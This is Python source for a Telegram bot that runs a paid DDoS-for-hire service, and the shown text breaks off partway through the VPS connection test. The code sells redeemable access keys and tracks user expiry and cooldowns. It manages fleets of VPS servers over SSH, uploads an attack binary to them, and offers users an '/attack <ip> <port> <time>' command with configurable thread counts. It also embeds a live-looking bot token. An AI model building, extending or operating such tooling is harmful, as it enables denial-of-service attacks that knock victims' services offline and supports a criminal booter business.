import os
import time
import asyncio
import json
import paramiko
import random
import string
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from datetime import datetime
import threading

# ==================== CONFIG ====================
TELEGRAM_TOKEN = "8752313261:AAHNvuF4Mrq74wrOyXV5YpVB_TP0vaetN9E"  # Apna token daalein
ADMIN_ID = 6088159228  # Apna admin ID daalein
VPS_FILE = "vps_servers.json"
APPROVED_FILE = "approved_users.json"
CONFIG_FILE = "config.json"
KEYS_FILE = "generated_keys.json"
REDEEM_LOG_FILE = "redeem_log.json"
COOLDOWN_FILE = "cooldown_tracker.json"  # New file to track user cooldowns

# Global variables
vps_servers = []
is_attack_running = False
current_attack_id = None
current_attack_end_time = None
attack_cooldown = 0
max_attack_duration = 300
attack_threads = 100
last_attack_time = None
last_attack_by = None  # Track who started the attack
user_sessions = {}
upload_session = {}

# Cooldown tracking for each user
user_cooldowns = {}  # {user_id: last_attack_time}

# Approved users structure: {user_id: {"expiry": timestamp, "type": "user/group", "added_by": admin_id}}
approved_users = {}

# Keys structure: {key: {"duration": seconds, "created_by": admin_id, "created_at": timestamp, "used_by": None or user_id, "used_at": None or timestamp, "active": True}}
generated_keys = {}

# Redeem log: [{key: "", user_id: "", username: "", redeemed_at: "", duration: ""}]
redeem_log = []

# ==================== LOAD/SAVE FUNCTIONS ====================
def load_data():
    global vps_servers, approved_users, attack_cooldown, max_attack_duration, attack_threads, generated_keys, redeem_log, user_cooldowns
    
    # Load VPS
    if os.path.exists(VPS_FILE):
        try:
            with open(VPS_FILE, 'r') as f:
                vps_servers = json.load(f)
        except:
            vps_servers = []
    
    # Load approved users
    if os.path.exists(APPROVED_FILE):
        try:
            with open(APPROVED_FILE, 'r') as f:
                approved_users = json.load(f)
                approved_users = {int(k) if k.isdigit() else k: v for k, v in approved_users.items()}
        except:
            approved_users = {}
    
    # Load config
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
                attack_cooldown = config.get('cooldown', 0)
                max_attack_duration = config.get('max_duration', 300)
                attack_threads = config.get('threads', 100)
        except:
            pass
    
    # Load keys
    if os.path.exists(KEYS_FILE):
        try:
            with open(KEYS_FILE, 'r') as f:
                generated_keys = json.load(f)
        except:
            generated_keys = {}
    
    # Load redeem log
    if os.path.exists(REDEEM_LOG_FILE):
        try:
            with open(REDEEM_LOG_FILE, 'r') as f:
                redeem_log = json.load(f)
        except:
            redeem_log = []
    
    # Load user cooldowns
    if os.path.exists(COOLDOWN_FILE):
        try:
            with open(COOLDOWN_FILE, 'r') as f:
                user_cooldowns = json.load(f)
                # Convert string keys to int
                user_cooldowns = {int(k): v for k, v in user_cooldowns.items()}
        except:
            user_cooldowns = {}

def save_data():
    with open(VPS_FILE, 'w') as f:
        json.dump(vps_servers, f, indent=2)
    
    with open(APPROVED_FILE, 'w') as f:
        json.dump(approved_users, f, indent=2)
    
    config = {
        'cooldown': attack_cooldown,
        'max_duration': max_attack_duration,
        'threads': attack_threads
    }
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)
    
    with open(KEYS_FILE, 'w') as f:
        json.dump(generated_keys, f, indent=2)
    
    with open(REDEEM_LOG_FILE, 'w') as f:
        json.dump(redeem_log, f, indent=2)
    
    # Save user cooldowns
    with open(COOLDOWN_FILE, 'w') as f:
        json.dump(user_cooldowns, f, indent=2)

# Initial load
load_data()

# ==================== BANNER ====================
BANNER = """
🔥 MULTI-VPS DDOS ATTACK SYSTEM v3.0     
👑 Owner: @SIDIKI_MUSTAFA_92 👑                 
"""

# Colors for terminal
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
R = '\033[0m'
P = '\033[95m'

# ==================== KEY GENERATION FUNCTIONS ====================
def generate_key(prefix="DDOS"):
    """Generate random key with prefix"""
    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    return f"{prefix}-{random_part}"

def parse_duration(duration_str):
    """Parse duration string like 1h, 2d, 3w, 1mo"""
    try:
        if duration_str.endswith('h'):
            return int(duration_str[:-1]) * 3600
        elif duration_str.endswith('d'):
            return int(duration_str[:-1]) * 86400
        elif duration_str.endswith('w'):
            return int(duration_str[:-1]) * 604800
        elif duration_str.endswith('mo'):
            return int(duration_str[:-2]) * 2592000
        else:
            return int(duration_str) * 3600
    except:
        return None

def format_duration(seconds):
    """Convert seconds to readable format"""
    if seconds < 60:
        return f"{seconds}s"
    elif seconds < 3600:
        return f"{seconds//60}m {seconds%60}s"
    elif seconds < 86400:
        hours = seconds // 3600
        minutes = (seconds % 3600) // 60
        return f"{hours}h {minutes}m"
    elif seconds < 604800:
        days = seconds // 86400
        hours = (seconds % 86400) // 3600
        return f"{days}d {hours}h"
    elif seconds < 2592000:
        weeks = seconds // 604800
        days = (seconds % 604800) // 86400
        return f"{weeks}w {days}d"
    else:
        months = seconds // 2592000
        weeks = (seconds % 2592000) // 604800
        return f"{months}mo {weeks}w"

# ==================== COOLDOWN CHECK FUNCTION ====================
def check_user_cooldown(user_id):
    """Check if user is in cooldown period"""
    global user_cooldowns
    
    if is_admin(user_id):
        return 0  # Admin has no cooldown
    
    if attack_cooldown <= 0:
        return 0  # Cooldown disabled
    
    if user_id in user_cooldowns:
        last_time = user_cooldowns[user_id]
        time_passed = time.time() - last_time
        if time_passed < attack_cooldown:
            return int(attack_cooldown - time_passed)  # Return remaining cooldown
    
    return 0  # No cooldown

def update_user_cooldown(user_id):
    """Update user's last attack time"""
    global user_cooldowns
    if not is_admin(user_id):  # Don't track admin cooldown
        user_cooldowns[user_id] = time.time()
        save_data()

def clean_expired_cooldowns():
    """Remove expired cooldown entries"""
    global user_cooldowns
    current_time = time.time()
    expired = []
    
    for user_id, last_time in user_cooldowns.items():
        if current_time - last_time > attack_cooldown:
            expired.append(user_id)
    
    for user_id in expired:
        del user_cooldowns[user_id]
    
    if expired:
        save_data()

# ==================== AUTHORIZATION CHECK ====================
def is_admin(user_id):
    return user_id == ADMIN_ID

def is_approved(user_id):
    if user_id == ADMIN_ID:
        return True
    
    # Check if user_id exists in approved_users (as string or int)
    str_user_id = str(user_id)
    if str_user_id in approved_users:
        user_data = approved_users[str_user_id]
        expiry = user_data.get('expiry', 0)
        if expiry == 0 or expiry > time.time():
            return True
        else:
            # Expired user - remove them
            del approved_users[str_user_id]
            save_data()
    
    return False

# ==================== START COMMAND ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "NoUsername"
    first_name = update.effective_user.first_name or "User"
    
    if not is_approved(user_id) and not is_admin(user_id):
        keyboard = [[InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"{BANNER}\n\n"
            f"❌ You are not authorized!\n\n"
            f"Please redeem a key to get access.\n"
            f"Contact owner: @SIDIKI_MUSTAFA_92",
            reply_markup=reply_markup
        )
        return
    
    if is_admin(user_id):
        # Admin panel with all stats
        active_vps = sum(1 for v in vps_servers if v.get('status') == 'active')
        total_vps = len(vps_servers)
        total_users = len(approved_users)
        total_keys = len(generated_keys)
        used_keys = sum(1 for k in generated_keys.values() if k.get('used_by'))
        
        text = f"""
{BANNER}

╔════════════════╗
║  👑 ADMIN PANEL 👑            
╚════════════════╝

📋 AVAILABLE COMMANDS:

🔐 VPS MANAGEMENT:
/add_vps ➔ Add new VPS
/remove_vps <ip> ➔ Remove VPS
/list_vps ➔ List all VPS
/test_vps ➔ Test connections
/upload ➔ Upload binary
/vps_stats ➔ Detailed VPS stats

🔑 KEY MANAGEMENT:
/gen <prefix> <duration> ➔ Generate key
/list_key ➔ List all keys
/delete_key <key> ➔ Delete key
/key_stats ➔ Key statistics

👥 USER MANAGEMENT:
/approve <id> <duration> ➔ Approve user
/disapprove <id> ➔ Remove user
/list_approved ➔ List approved
/broadcast <msg> ➔ Broadcast
/cooldown_status ➔ Check user cooldowns

⚙️ CONFIGURATION:
/set_cooldown <sec> ➔ Set cooldown
/setmax_duration <sec> ➔ Set max time
/set_threads <num> ➔ Set threads

⚡ ATTACK:
/attack <ip> <port> <time> ➔ Start attack
/status ➔ Attack status
        """
    else:
        # User panel - NO VPS STATS
        user_data = approved_users.get(str(user_id), {})
        expiry = user_data.get('expiry', 0)
        expiry_text = "Never" if expiry == 0 else datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S')
        
        # Check user's cooldown
        cooldown_remaining = check_user_cooldown(user_id)
        cooldown_text = f"{cooldown_remaining}s" if cooldown_remaining > 0 else "Ready"
        
        text = f"""
{BANNER}

╔═════════════╗
║ 👤 USER PANEL 👤                  
╚═════════════╝

📋 YOUR INFO:
🆔 ID: {user_id}
👤 Name: {first_name}
👤 Username: @{username}
⏱️ Access Until: {expiry_text}
⏱️ Your Cooldown: {cooldown_text}

⚡ AVAILABLE COMMANDS:
/attack <ip> <port> <time> ➔ Start attack
/status ➔ Attack status
/mycooldown ➔ Check your cooldown
        """
    
    await update.message.reply_text(text)

# ==================== KEY GENERATION COMMANDS ====================
async def gen_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text(
            "❌ Usage: /gen <prefix> <duration>\n\n"
            "Examples:\n"
            "/gen VIP 30d  ➔ 30 days key\n"
            "/gen PREM 7d  ➔ 7 days key\n"
            "/gen FREE 1h  ➔ 1 hour key\n\n"
            "Duration formats: 1h, 2d, 3w, 1mo"
        )
        return
    
    prefix = context.args[0].upper()
    duration_str = context.args[1]
    
    seconds = parse_duration(duration_str)
    if seconds is None:
        await update.message.reply_text("❌ Invalid duration! Use: 1h, 2d, 3w, 1mo")
        return
    
    # Generate unique key
    while True:
        key = generate_key(prefix)
        if key not in generated_keys:
            break
    
    generated_keys[key] = {
        'duration': seconds,
        'duration_str': duration_str,
        'created_by': user_id,
        'created_at': time.time(),
        'used_by': None,
        'used_at': None,
        'active': True,
        'prefix': prefix
    }
    save_data()
    
    expiry_date = datetime.fromtimestamp(time.time() + seconds).strftime('%Y-%m-%d %H:%M:%S')
    
    # Create fancy key card
    key_card = f"""
╔═════════════════╗
║         🔑 KEY GENERATED           
╠═════════════════╣
║  Key: {key}
║  Duration: {duration_str} ({format_duration(seconds)})
║  Expires: {expiry_date}
║  Status: 🟢 Active
╚═════════════════╝
    """
    
    await update.message.reply_text(key_card)
    
    # Also send as code for easy copy
    await update.message.reply_text(f"`{key}`", parse_mode="MarkdownV2")

async def redeem_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "NoUsername"
    first_name = update.effective_user.first_name or "User"
    
    if is_approved(user_id):
        await update.message.reply_text("✅ You already have access! Use /start")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text(
            "❌ Usage: /redeem <key>\n\n"
            "Example: /redeem VIP-ABCD1234"
        )
        return
    
    key = context.args[0].upper()
    
    if key not in generated_keys:
        await update.message.reply_text("❌ Invalid key!")
        return
    
    key_data = generated_keys[key]
    
    if not key_data.get('active', True):
        await update.message.reply_text("❌ This key has been deactivated!")
        return
    
    if key_data.get('used_by') is not None:
        await update.message.reply_text("❌ This key has already been used!")
        return
    
    # Activate user
    expiry = time.time() + key_data['duration']
    
    approved_users[str(user_id)] = {
        'expiry': expiry,
        'type': 'user',
        'added_by': 'key_redeem',
        'added_at': time.time(),
        'key_used': key
    }
    
    # Update key data
    key_data['used_by'] = user_id
    key_data['used_at'] = time.time()
    key_data['username'] = username
    key_data['first_name'] = first_name
    
    # Add to redeem log
    redeem_log.append({
        'key': key,
        'user_id': user_id,
        'username': username,
        'first_name': first_name,
        'redeemed_at': time.time(),
        'duration': key_data['duration'],
        'duration_str': key_data.get('duration_str', format_duration(key_data['duration'])),
        'expiry': expiry
    })
    
    save_data()
    
    expiry_date = datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S')
    
    # Success message for user
    success_msg = f"""
╔═════════════════════════╗
║  ✅ KEY REDEEMED SUCCESSFULLY  
╠═════════════════════════╣
║  👤 User: {first_name}
║  🆔 ID: {user_id}
║  🔑 Key: {key}
║  ⏱️ Duration: {key_data.get('duration_str', format_duration(key_data['duration']))}
║  📅 Expires: {expiry_date}
║  📢 Use /start to begin!
╚═════════════════════════╝
    """
    
    await update.message.reply_text(success_msg)
    
    # Notify admin
    try:
        admin_msg = f"""
🔑 KEY REDEEMED

Key: {key}
User: {first_name} (@{username})
ID: {user_id}
Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Duration: {key_data.get('duration_str', format_duration(key_data['duration']))}
Expires: {expiry_date}
        """
        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg)
    except:
        pass

async def list_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if not generated_keys:
        await update.message.reply_text("📭 No keys generated yet!")
        return
    
    # Statistics
    total_keys = len(generated_keys)
    used_keys = sum(1 for k in generated_keys.values() if k.get('used_by') is not None)
    unused_keys = total_keys - used_keys
    active_keys = sum(1 for k in generated_keys.values() if k.get('active', True))
    
    # Group by prefix
    prefixes = {}
    for key, data in generated_keys.items():
        prefix = key.split('-')[0]
        if prefix not in prefixes:
            prefixes[prefix] = {'total': 0, 'used': 0}
        prefixes[prefix]['total'] += 1
        if data.get('used_by'):
            prefixes[prefix]['used'] += 1
    
    prefix_text = ""
    for prefix, stats in prefixes.items():
        prefix_text += f"  {prefix}: {stats['used']}/{stats['total']} used\n"
    
    # Recent keys (last 5)
    recent_keys = sorted(generated_keys.items(), key=lambda x: x[1]['created_at'], reverse=True)[:5]
    
    recent_text = ""
    for key, data in recent_keys:
        status = "✅ Used" if data.get('used_by') else "🟢 Available"
        if not data.get('active', True):
            status = "🔴 Deleted"
        user_info = f" by {data.get('username', 'Unknown')}" if data.get('used_by') else ""
        recent_text += f"  {key} - {status}{user_info}\n"
    
    stats_msg = f"""
╔════════════════╗
║        📊 KEY STATISTICS           
╠════════════════╣
║  Total Keys: {total_keys}
║  Used: {used_keys}
║  Unused: {unused_keys}
║  Active: {active_keys}
║
║  BY PREFIX:
{prefix_text}
║
║  RECENT KEYS:
{recent_text}
╚════════════════╝
    """
    
    await update.message.reply_text(stats_msg)
    
    # Send full list in parts if needed
    if total_keys > 10:
        full_list = "📋 ALL KEYS:\n\n"
        for key, data in sorted(generated_keys.items(), key=lambda x: x[1]['created_at'], reverse=True):
            status = "✅" if data.get('used_by') else "🟢"
            if not data.get('active', True):
                status = "🔴"
            user_info = f" by {data.get('username', 'Unknown')}" if data.get('used_by') else ""
            created = datetime.fromtimestamp(data['created_at']).strftime('%m-%d')
            full_list += f"{status} {key} ({created}){user_info}\n"
        
        # Split long messages
        if len(full_list) > 4000:
            parts = [full_list[i:i+4000] for i in range(0, len(full_list), 4000)]
            for part in parts:
                await update.message.reply_text(part)
        else:
            await update.message.reply_text(full_list)

async def delete_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: /delete_key <key>\n\nExample: /delete_key VIP-ABCD1234")
        return
    
    key = context.args[0].upper()
    
    if key not in generated_keys:
        await update.message.reply_text("❌ Key not found!")
        return
    
    key_data = generated_keys[key]
    
    # If key was used, remove user access
    if key_data.get('used_by'):
        used_user_id = str(key_data['used_by'])
        if used_user_id in approved_users:
            del approved_users[used_user_id]
            await update.message.reply_text(f"👤 User {used_user_id}'s access revoked!")
    
    # Mark key as inactive
    key_data['active'] = False
    key_data['deleted_at'] = time.time()
    key_data['deleted_by'] = user_id
    
    save_data()
    
    await update.message.reply_text(f"✅ Key {key} deleted and user access revoked!")

async def key_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if not redeem_log:
        await update.message.reply_text("📭 No redeem history!")
        return
    
    # Overall stats
    total_redeems = len(redeem_log)
    
    # Last 10 redeems
    recent = redeem_log[-10:] if len(redeem_log) > 10 else redeem_log
    
    recent_text = ""
    for entry in reversed(recent):
        date = datetime.fromtimestamp(entry['redeemed_at']).strftime('%Y-%m-%d %H:%M')
        recent_text += f"  • {date} - {entry['first_name']} (@{entry['username']}) - {entry['key']}\n"
    
    # Top users
    user_counts = {}
    for entry in redeem_log:
        uid = entry['user_id']
        if uid not in user_counts:
            user_counts[uid] = {'count': 0, 'name': entry['first_name']}
        user_counts[uid]['count'] += 1
    
    top_users = sorted(user_counts.items(), key=lambda x: x[1]['count'], reverse=True)[:5]
    
    top_text = ""
    for uid, data in top_users:
        top_text += f"  • {data['name']}: {data['count']} keys\n"
    
    # Daily stats
    today = time.time()
    day_ago = today - 86400
    week_ago = today - 604800
    month_ago = today - 2592000
    
    today_count = sum(1 for e in redeem_log if e['redeemed_at'] > day_ago)
    week_count = sum(1 for e in redeem_log if e['redeemed_at'] > week_ago)
    month_count = sum(1 for e in redeem_log if e['redeemed_at'] > month_ago)
    
    stats_msg = f"""
╔══════════════════╗
║     📊 REDEEM STATISTICS           
╠══════════════════╣
║  Total Redeems: {total_redeems}
║  Last 24h: {today_count}
║  Last 7d: {week_count}
║  Last 30d: {month_count}
║
║  TOP USERS:
{top_text}
║
║  RECENT REDEEMS (last {len(recent)}):
{recent_text}
╚═════════════════╝
    """
    
    await update.message.reply_text(stats_msg)

# ==================== USER APPROVAL COMMANDS ====================
async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text(
            "❌ Usage: /approve <user_id> <duration>\n\n"
            "Duration: 1h, 2d, 3w, 1mo\n"
            "Example: /approve 123456789 30d"
        )
        return
    
    try:
        target_id = int(context.args[0])
        duration_str = context.args[1]
        
        seconds = parse_duration(duration_str)
        if seconds is None:
            await update.message.reply_text("❌ Invalid duration! Use: 1h, 2d, 3w, 1mo")
            return
        
        expiry = time.time() + seconds if seconds > 0 else 0
        
        approved_users[str(target_id)] = {
            'expiry': expiry,
            'type': 'user',
            'added_by': user_id,
            'added_at': time.time(),
            'duration_str': duration_str
        }
        save_data()
        
        expiry_date = datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S') if expiry > 0 else 'Never'
        
        await update.message.reply_text(
            f"✅ USER APPROVED\n\n"
            f"👤 ID: {target_id}\n"
            f"⏱️ Duration: {duration_str}\n"
            f"📅 Expires: {expiry_date}"
        )
        
        try:
            await context.bot.send_message(
                chat_id=target_id,
                text=f"✅ You have been approved!\n\n⏱️ Duration: {duration_str}\nUse /start to begin!"
            )
        except:
            await update.message.reply_text("⚠️ Could not notify user (user might have blocked the bot)")
            
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def disapprove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: /disapprove <user_id>")
        return
    
    try:
        target_id = str(context.args[0])
        
        if target_id in approved_users:
            del approved_users[target_id]
            save_data()
            await update.message.reply_text(f"✅ User {target_id} removed from approved list")
        else:
            await update.message.reply_text("❌ User not found in approved list")
            
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def list_approved(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if not approved_users:
        await update.message.reply_text("📋 No approved users")
        return
    
    text = "📋 APPROVED USERS\n\n"
    
    for uid, data in approved_users.items():
        expiry = datetime.fromtimestamp(data['expiry']).strftime('%Y-%m-%d %H:%M:%S') if data['expiry'] > 0 else 'Never'
        added = datetime.fromtimestamp(data['added_at']).strftime('%Y-%m-%d')
        source = "🔑 Key" if data.get('added_by') == 'key_redeem' else "👑 Admin"
        text += f"👤 USER: {uid}\n"
        text += f"   ⏱️ Expires: {expiry}\n"
        text += f"   📅 Added: {added} ({source})\n\n"
    
    text += f"📊 Total: {len(approved_users)}"
    
    # Split if too long
    if len(text) > 4000:
        parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
        for part in parts:
            await update.message.reply_text(part)
    else:
        await update.message.reply_text(text)

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text("❌ Usage: /broadcast <message>")
        return
    
    message = ' '.join(context.args)
    
    msg = await update.message.reply_text("📢 Broadcasting message...")
    
    sent = 0
    failed = 0
    
    for uid in approved_users.keys():
        try:
            await context.bot.send_message(
                chat_id=int(uid),
                text=f"📢 BROADCAST MESSAGE\n\n{message}\n\n— Admin"
            )
            sent += 1
            await asyncio.sleep(0.05)  # Rate limit
        except:
            failed += 1
    
    await msg.edit_text(
        f"✅ Broadcast complete!\n\n"
        f"📨 Sent: {sent}\n"
        f"❌ Failed: {failed}"
    )

# ==================== COOLDOWN MANAGEMENT COMMANDS ====================
async def cooldown_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command to check all users' cooldown status"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    clean_expired_cooldowns()
    
    if not user_cooldowns:
        await update.message.reply_text("📊 No users in cooldown currently.")
        return
    
    text = "📊 USER COOLDOWN STATUS\n\n"
    current_time = time.time()
    
    for uid, last_time in user_cooldowns.items():
        remaining = int(attack_cooldown - (current_time - last_time))
        if remaining > 0:
            # Get username if available
            username = "Unknown"
            for key_data in generated_keys.values():
                if key_data.get('used_by') == uid:
                    username = key_data.get('username', 'Unknown')
                    break
            
            text += f"👤 User: {uid} (@{username})\n"
            text += f"⏱️ Remaining: {remaining}s\n\n"
    
    await update.message.reply_text(text)

async def mycooldown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """User command to check their own cooldown"""
    user_id = update.effective_user.id
    
    if not is_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    remaining = check_user_cooldown(user_id)
    
    if remaining > 0:
        await update.message.reply_text(f"⏱️ Your cooldown: {remaining}s remaining")
    else:
        await update.message.reply_text("✅ You are ready to attack!")

# ==================== CONFIGURATION COMMANDS ====================
async def set_cooldown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: /set_cooldown <seconds>")
        return
    
    try:
        global attack_cooldown
        attack_cooldown = int(context.args[0])
        if attack_cooldown < 0:
            attack_cooldown = 0
        save_data()
        
        await update.message.reply_text(f"✅ Cooldown set to {attack_cooldown} seconds for ALL users")
    except:
        await update.message.reply_text("❌ Invalid number!")

async def set_max_duration(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: /setmax_duration <seconds>")
        return
    
    try:
        global max_attack_duration
        max_attack_duration = int(context.args[0])
        if max_attack_duration < 1:
            max_attack_duration = 1
        if max_attack_duration > 3600:
            max_attack_duration = 3600
        save_data()
        
        await update.message.reply_text(f"✅ Max duration set to {max_attack_duration} seconds")
    except:
        await update.message.reply_text("❌ Invalid number!")

async def set_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: /set_threads <number>")
        return
    
    try:
        global attack_threads
        threads = int(context.args[0])
        if threads < 1:
            threads = 1
        if threads > 1000:
            threads = 1000
        
        attack_threads = threads
        save_data()
        
        await update.message.reply_text(f"✅ Threads set to {attack_threads}")
    except:
        await update.message.reply_text("❌ Invalid number!")

# ==================== VPS MANAGEMENT COMMANDS ====================
async def add_vps_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    keyboard = [
        [InlineKeyboardButton("🖥️ Direct VPS (Password)", callback_data="add_direct_vps")],
        [InlineKeyboardButton("☁️ AWS VPS (PEM File)", callback_data="add_aws_vps")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text("🔐 SELECT VPS TYPE:", reply_markup=reply_markup)

async def remove_vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: /remove_vps <ip>")
        return
    
    ip = context.args[0]
    
    for i, vps in enumerate(vps_servers):
        if vps['ip'] == ip:
            if vps.get('pem_path') and os.path.exists(vps['pem_path']):
                try:
                    os.remove(vps['pem_path'])
                except:
                    pass
            vps_servers.pop(i)
            save_data()
            await update.message.reply_text(f"✅ VPS {ip} removed!")
            return
    
    await update.message.reply_text(f"❌ VPS {ip} not found!")

async def list_vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if not vps_servers:
        await update.message.reply_text("❌ No VPS servers added!")
        return
    
    text = "📋 VPS SERVERS LIST\n\n"
    
    active_count = 0
    for i, vps in enumerate(vps_servers, 1):
        status = vps.get('status', 'unknown')
        status_emoji = "✅" if status == 'active' else "⚠️" if status == 'no_binary' else "❌"
        auth = "🔐" if vps.get('auth_type') == 'password' else "🔑"
        
        if status == 'active':
            active_count += 1
        
        text += f"{status_emoji} VPS #{i}\n"
        text += f"   🌍 IP: {vps['ip']}\n"
        text += f"   {auth} Auth: {vps.get('auth_type')}\n"
        text += f"   ⚡ Attacks: {vps.get('attack_count', 0)}\n\n"
    
    text += f"📊 TOTAL: {len(vps_servers)} (✅ {active_count} Active)"
    
    # Split if too long
    if len(text) > 4000:
        parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
        for part in parts:
            await update.message.reply_text(part)
    else:
        await update.message.reply_text(text)

async def vps_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin-only detailed VPS statistics"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if not vps_servers:
        await update.message.reply_text("❌ No VPS servers!")
        return
    
    active = sum(1 for v in vps_servers if v.get('status') == 'active')
    dead = sum(1 for v in vps_servers if v.get('status') == 'dead')
    no_binary = sum(1 for v in vps_servers if v.get('status') == 'no_binary')
    
    password = sum(1 for v in vps_servers if v.get('auth_type') == 'password')
    pem = sum(1 for v in vps_servers if v.get('auth_type') == 'pem')
    
    total_attacks = sum(v.get('attack_count', 0) for v in vps_servers)
    
    # Get last used VPS - FIXED: Handle None values properly
    last_used = None
    last_used_time = 0
    for v in vps_servers:
        # Get last_used value, default to 0 if None or missing
        v_last_used = v.get('last_used')
        if v_last_used is not None and v_last_used > last_used_time:
            last_used_time = v_last_used
            last_used = v['ip']
    
    last_used_str = datetime.fromtimestamp(last_used_time).strftime('%Y-%m-%d %H:%M:%S') if last_used_time > 0 else 'Never'
    
    text = f"""
📊 VPS DETAILED STATISTICS

🖥️ OVERALL:
• Total VPS: {len(vps_servers)}
• ✅ Active: {active}
• ⚠️ No Binary: {no_binary}
• ❌ Dead: {dead}

🔐 AUTHENTICATION:
• Password: {password}
• PEM: {pem}

⚡ ATTACKS:
• Total Attacks: {total_attacks}
• Last Used: {last_used if last_used else 'None'} ({last_used_str})

📋 ACTIVE VPS LIST:
"""
    
    # List active VPS
    active_count = 0
    for v in vps_servers:
        if v.get('status') == 'active':
            active_count += 1
            if active_count <= 10:  # Show only first 10
                text += f"  {active_count}. {v['ip']} (Attacks: {v.get('attack_count', 0)})\n"
    
    if active_count > 10:
        text += f"  ... and {active_count - 10} more\n"
    
    await update.message.reply_text(text)

async def test_vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if not vps_servers:
        await update.message.reply_text("❌ No VPS servers!")
        return
    
    msg = await update.message.reply_text("🔄 Testing VPS connections...")
    
    results = []
    active = 0
    
    for vps in vps_servers:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            if vps.get('auth_type') == 'pem':
                client.connect(vps['ip'], port=vps['port'], username=vps['username'], 
                             key_filename=vps['pem_path'], timeout=5, allow_agent=False, look_for_keys=False)
            else:
                client.connect(vps['ip'], port=vps['port'], username=vps['username'], 
                             password=vps.get('password', ''), timeout=5, allow_agent=False, look_for_keys=False)
            
            # Check if binary exists
            stdin, stdout, stderr = client.exec_command("ls -la mustafa 2>/dev/null || echo 'NOTFOUND'")
            output = stdout.read().decode().strip()
            
            client.close()
            
            if 'NOTFOUND' not in output:
